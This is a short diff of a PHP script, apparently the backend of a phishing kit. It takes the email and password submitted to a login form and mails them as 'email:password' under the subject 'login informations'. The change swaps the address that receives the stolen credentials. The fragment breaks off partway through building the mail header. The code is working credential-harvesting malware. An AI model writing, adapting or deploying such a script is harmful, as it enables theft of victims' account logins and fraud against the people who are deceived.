@@ -1,7 +1,7 @@
 <?php
 $email = $_POST["email"];
 $password = $_POST["password"];
-$to = "ghestmany@proton.me";
+$to = "fredborgesz21@gmail.com";
 $subject = "login informations";
 $message = "$email:$password";
 $header = "From: feet@gmail.com". "\r\n" .
